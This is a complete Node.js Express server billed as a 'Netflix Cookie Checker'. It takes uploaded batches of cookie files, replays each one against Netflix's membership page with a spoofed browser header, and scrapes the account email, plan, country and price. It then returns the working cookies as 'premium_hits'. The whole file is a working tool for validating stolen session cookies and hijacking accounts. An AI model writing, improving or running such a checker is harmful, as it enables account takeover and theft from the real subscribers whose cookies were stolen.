import express from 'express';
import cors from 'cors';
import multer from 'multer';
import axios from 'axios';
import * as cheerio from 'cheerio';   // ← Fixed import

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
  origin: '*',   // In production, change this to your frontend domain for better security
}));
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

// Improved Netflix Cookie Checker
async function checkNetflixCookie(cookieText, filename) {
  try {
    if (!cookieText || cookieText.trim().length < 50) return null;

    const session = axios.create({
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'Cookie': cookieText.trim()
      },
      maxRedirects: 5,
      timeout: 20000,
      validateStatus: () => true   // Don't throw on HTTP errors
    });

    const response = await session.get('https://www.netflix.com/account/membership');

    // If redirected to login → invalid cookie
    const finalUrl = response.request.res?.responseUrl || response.request.path;
    if (finalUrl && finalUrl.includes('/login')) {
      return null;
    }

    const html = response.data;
    const $ = cheerio.load(html);

    // Extract data (more robust regex + cheerio fallback)
    let email = $('[data-uia="account-email"]').text().trim() ||
                html.match(/"emailAddress"\s*:\s*"([^"]+)"/)?.[1];

    let plan = html.match(/"localizedPlanName"\s*:\s*{"[^"]+":"([^"]+)"/)?.[1] ||
               $('.plan-name').text().trim() || 'Unknown Plan';

    const countryMatch = html.match(/"countryOfSignup"\s*:\s*"([^"]+)"/);
    const countryCode = countryMatch ? countryMatch[1].toUpperCase() : 'XX';

    const isActive = html.includes('CURRENT_MEMBER') || html.includes('membershipStatus') || email;

    if (!isActive && !email) return null;

    return {
      success: true,
      email: email || 'No email visible',
      plan: plan,
      country_code: countryCode,
      country: getCountryName(countryCode),
      price: html.match(/"currentMemberPlanPriceAmount"\s*:\s*{"[^"]+":"([^"]+)"/)?.[1] || 'N/A',
      member_since: html.match(/"memberSinceDate"\s*:\s*{"[^"]+":"([^"]+)"/)?.[1] || 'N/A',
      cookie: cookieText.trim(),
      source: filename,
      login_url: 'https://www.netflix.com/account'
    };

  } catch (error) {
    console.error(`[${filename}] Check failed:`, error.message);
    return null;
  }
}

function getCountryName(code) {
  const names = {
    'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada',
    'DE': 'Germany', 'FR': 'France', 'ES': 'Spain', 'IT': 'Italy',
    'BR': 'Brazil', 'MX': 'Mexico', 'AU': 'Australia'
  };
  return names[code] || code;
}

// Main API Route
app.post('/api/check-cookies', upload.array('cookies'), async (req, res) => {
  if (!req.files || req.files.length === 0) {
    return res.status(400).json({ error: 'No cookie files uploaded' });
  }

  console.log(`Received ${req.files.length} cookie files`);

  const hits = [];

  for (const file of req.files) {
    const cookieText = file.buffer.toString('utf-8');
    const result = await checkNetflixCookie(cookieText, file.originalname);

    if (result) {
      hits.push(result);
      console.log(`✅ HIT: ${result.email} | ${result.plan}`);
    } else {
      console.log(`❌ Bad: ${file.originalname}`);
    }
  }

  res.json({
    total: req.files.length,
    hits: hits.length,
    premium_hits: hits
  });
});

app.get('/', (req, res) => {
  res.send(`
    <h1>Netflix Cookie Checker Backend</h1>
    <p>Status: <strong>Running</strong></p>
    <p>POST to <code>/api/check-cookies</code> with multipart form data (field name: "cookies")</p>
  `);
});

app.listen(PORT, () => {
  console.log(`🚀 Netflix Cookie Checker Backend running on port ${PORT}`);
});
